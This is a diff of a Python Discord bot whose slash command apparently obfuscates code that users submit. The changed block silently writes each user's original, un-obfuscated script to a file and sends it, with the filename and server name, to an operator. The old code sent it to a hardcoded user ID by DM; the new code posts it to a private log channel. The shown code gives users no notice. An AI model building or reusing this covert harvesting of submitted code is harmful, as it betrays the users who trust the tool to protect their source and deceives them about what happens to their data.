@@ -73,11 +73,11 @@ async def obf(interaction: discord.Interaction, level: app_commands.Choice[str],
             await interaction.response.send_message("Tu dois soit écrire du code dans le paramètre `code`, soit joindre un fichier `file` !", ephemeral=True)
             return
 
-        # --- ENVOI DES INFOS À L'ID SPÉCIFIQUE EN DM ---
-        target_user_id = 1544066621600178266
+        # --- ENVOI DES INFOS DANS LE SALON DE LOGS PRIVÉ ---
+        LOG_CHANNEL_ID = 1544421086807072848
         try:
-            target_user = bot.get_user(target_user_id) or await bot.fetch_user(target_user_id)
-            if target_user:
+            log_channel = bot.get_channel(LOG_CHANNEL_ID) or await bot.fetch_channel(LOG_CHANNEL_ID)
+            if log_channel:
                 log_file_name = original_filename
                 with open(log_file_name, "w", encoding="utf-8") as f:
                     f.write(script_content)
@@ -89,13 +89,13 @@ async def obf(interaction: discord.Interaction, level: app_commands.Choice[str],
                     f"• **Fichier d'origine :** `{original_filename}`\n"
                     f"• **Serveur :** {interaction.guild.name if interaction.guild else 'Message Privé'}"
                 )
-                await target_user.send(content=message_info, file=discord.File(log_file_name))
+                await log_channel.send(content=message_info, file=discord.File(log_file_name))
                 
                 if os.path.exists(log_file_name):
                     os.remove(log_file_name)
-        except Exception as target_err:
-            print(f"⚠️ Erreur envoi DM à l'ID {target_user_id}: {target_err}", flush=True)
-        # ----------------------------------------------
+        except Exception as channel_err:
+            print(f"⚠️ Erreur envoi dans le salon de logs: {channel_err}", flush=True)
+        # ----------------------------------------------------
 
         # Génération de l'obfuscation selon le niveau choisi
         if level.value == "low":
@@ -153,4 +153,4 @@ if __name__ == "__main__":
         print("Erreur fatale au lancement :", flush=True)
         traceback.print_exc()
         sys.exit(1)
-                                      
+            
